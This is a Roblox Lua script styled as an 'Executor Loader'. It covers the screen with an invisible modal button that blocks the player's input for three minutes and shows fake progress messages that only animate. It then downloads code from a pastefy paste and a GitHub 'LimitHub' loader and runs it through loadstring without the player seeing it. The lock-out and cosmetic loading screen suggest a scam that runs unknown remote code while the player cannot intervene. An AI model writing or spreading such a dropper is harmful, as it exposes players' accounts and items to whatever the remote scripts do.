--// Services
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local player = Players.LocalPlayer

--// Configuration
local CONFIG = {
    BLOCK_DURATION = 180, -- 3 minutes in seconds
    LOADING_STEPS = {
        { text = "Initializing Executor...", duration = 1 },
        { text = "Checking Environment...", duration = 1.5 },
        { text = "Loading Scripts...", duration = 1 },
        { text = "Executor Ready!", duration = 0.5 }
    },
    SCRIPTS = {
        "https://pastefy.app/fJnI69gN/raw",
        "https://raw.githubusercontent.com/FakeModz/LimitHub/refs/heads/main/LimitHub_Loader.lua"
    }
}

--// Utility Functions
local function safeDestroy(object)
    if object and object.Parent then
        object:Destroy()
    end
end

local function createTween(object, info, properties)
    return TweenService:Create(object, info, properties)
end

--// Input Blocker (Enhanced)
local function blockUserInput(duration)
    local inputBlocker = Instance.new("ScreenGui")
    inputBlocker.Name = "InputBlocker_" .. tick()
    inputBlocker.ResetOnSpawn = false
    inputBlocker.IgnoreGuiInset = true
    inputBlocker.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    inputBlocker.Parent = CoreGui
    
    local blocker = Instance.new("TextButton")
    blocker.Size = UDim2.new(1, 0, 1, 0)
    blocker.Position = UDim2.new(0, 0, 0, 0)
    blocker.BackgroundTransparency = 1
    blocker.Text = ""
    blocker.Modal = true
    blocker.AutoButtonColor = false
    blocker.Active = true
    blocker.Parent = inputBlocker
    
    -- Auto-cleanup after duration
    task.delay(duration, function()
        safeDestroy(inputBlocker)
    end)
    
    return inputBlocker
end

--// Enhanced Loading UI
local function createLoadingUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "ExecutorLoaderUI_" .. tick()
    screenGui.ResetOnSpawn = false
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.Parent = player:WaitForChild("PlayerGui")
    
    -- Main Frame with gradient background
    local frame = Instance.new("Frame")
    frame.Parent = screenGui
    frame.Size = UDim2.new(0, 450, 0, 250)
    frame.Position = UDim2.new(0.5, -225, 0.5, -125)
    frame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
    frame.BorderSizePixel = 0
    
    -- Add corner radius
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = frame
    
    -- Add stroke border
    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(70, 130, 255)
    stroke.Thickness = 2
    stroke.Parent = frame
    
    -- Gradient background
    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(35, 35, 50)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 25))
    }
    gradient.Rotation = 45
    gradient.Parent = frame
    
    -- Title Label
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Parent = frame
    titleLabel.Size = UDim2.new(1, -20, 0, 40)
    titleLabel.Position = UDim2.new(0, 10, 0, 15)
    titleLabel.BackgroundTransparency = 1
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.TextSize = 20
    titleLabel.Text = "🚀 Executor Loader"
    titleLabel.TextXAlignment = Enum.TextXAlignment.Center
    
    -- Status Label
    local statusLabel = Instance.new("TextLabel")
    statusLabel.Parent = frame
    statusLabel.Size = UDim2.new(1, -40, 0, 60)
    statusLabel.Position = UDim2.new(0, 20, 0, 70)
    statusLabel.BackgroundTransparency = 1
    statusLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
    statusLabel.Font = Enum.Font.Gotham
    statusLabel.TextSize = 16
    statusLabel.Text = "Initializing..."
    statusLabel.TextXAlignment = Enum.TextXAlignment.Center
    statusLabel.TextWrapped = true
    
    -- Progress Bar Background
    local progressBg = Instance.new("Frame")
    progressBg.Parent = frame
    progressBg.Size = UDim2.new(0.8, 0, 0, 6)
    progressBg.Position = UDim2.new(0.1, 0, 0, 160)
    progressBg.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
    progressBg.BorderSizePixel = 0
    
    local progressCorner = Instance.new("UICorner")
    progressCorner.CornerRadius = UDim.new(0, 3)
    progressCorner.Parent = progressBg
    
    -- Progress Bar Fill
    local progressFill = Instance.new("Frame")
    progressFill.Parent = progressBg
    progressFill.Size = UDim2.new(0, 0, 1, 0)
    progressFill.Position = UDim2.new(0, 0, 0, 0)
    progressFill.BackgroundColor3 = Color3.fromRGB(70, 130, 255)
    progressFill.BorderSizePixel = 0
    
    local fillCorner = Instance.new("UICorner")
    fillCorner.CornerRadius = UDim.new(0, 3)
    fillCorner.Parent = progressFill
    
    -- Progress gradient
    local progressGradient = Instance.new("UIGradient")
    progressGradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(70, 130, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 160, 255))
    }
    progressGradient.Parent = progressFill
    
    -- Loading dots animation
    local dotsLabel = Instance.new("TextLabel")
    dotsLabel.Parent = frame
    dotsLabel.Size = UDim2.new(1, 0, 0, 30)
    dotsLabel.Position = UDim2.new(0, 0, 0, 180)
    dotsLabel.BackgroundTransparency = 1
    dotsLabel.TextColor3 = Color3.fromRGB(150, 150, 200)
    dotsLabel.Font = Enum.Font.Gotham
    dotsLabel.TextSize = 14
    dotsLabel.Text = ""
    dotsLabel.TextXAlignment = Enum.TextXAlignment.Center
    
    return screenGui, statusLabel, progressFill, dotsLabel
end

--// Animated Loading Sequence
local function runLoadingSequence(statusLabel, progressFill, dotsLabel)
    local totalSteps = #CONFIG.LOADING_STEPS
    
    -- Dots animation coroutine
    local dotsRunning = true
    task.spawn(function()
        local dots = ""
        while dotsRunning do
            for i = 1, 3 do
                if not dotsRunning then break end
                dots = dots .. "."
                dotsLabel.Text = dots
                task.wait(0.5)
            end
            dots = ""
            dotsLabel.Text = dots
            task.wait(0.5)
        end
    end)
    
    -- Run loading steps
    for i, step in ipairs(CONFIG.LOADING_STEPS) do
        statusLabel.Text = step.text
        
        -- Animate progress bar
        local targetProgress = i / totalSteps
        local progressTween = createTween(
            progressFill,
            TweenInfo.new(step.duration * 0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            { Size = UDim2.new(targetProgress, 0, 1, 0) }
        )
        progressTween:Play()
        
        task.wait(step.duration)
    end
    
    dotsRunning = false
    dotsLabel.Text = "✓ Complete"
end

--// Script Loader with Enhanced Error Handling
local function loadScripts()
    local loadedCount = 0
    local totalScripts = #CONFIG.SCRIPTS
    
    for i, scriptUrl in ipairs(CONFIG.SCRIPTS) do
        task.spawn(function()
            local success, result = pcall(function()
                local scriptContent = game:HttpGet(scriptUrl, true)
                if scriptContent and scriptContent ~= "" then
                    local loadSuccess, loadError = pcall(function()
                        loadstring(scriptContent)()
                    end)
                    if loadSuccess then
                        loadedCount = loadedCount + 1
                        print(string.format("✅ Script %d/%d loaded successfully", i, totalScripts))
                    else
                        warn(string.format("❌ Script %d execution failed: %s", i, tostring(loadError)))
                    end
                else
                    warn(string.format("❌ Script %d: Empty or invalid content", i))
                end
            end)
            
            if not success then
                warn(string.format("❌ Script %d HTTP request failed: %s", i, tostring(result)))
            end
        end)
    end
    
    -- Wait a moment for scripts to initialize
    task.wait(1)
    print(string.format("📊 Loading complete: %d/%d scripts loaded successfully", loadedCount, totalScripts))
end

--// Main Execution
local function main()
    -- Block user input for specified duration
    local inputBlocker = blockUserInput(CONFIG.BLOCK_DURATION)
    
    -- Create and show loading UI
    local loadingUI, statusLabel, progressFill, dotsLabel = createLoadingUI()
    
    -- Run loading animation
    runLoadingSequence(statusLabel, progressFill, dotsLabel)
    
    -- Small delay before cleanup
    task.wait(0.5)
    
    -- Cleanup UI with fade animation
    local fadeInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local fadeTween = createTween(loadingUI, fadeInfo, { 
        Enabled = false 
    })
    
    fadeTween:Play()
    fadeTween.Completed:Connect(function()
        safeDestroy(loadingUI)
    end)
    
    -- Load scripts
    loadScripts()
end

--// Execute
main()
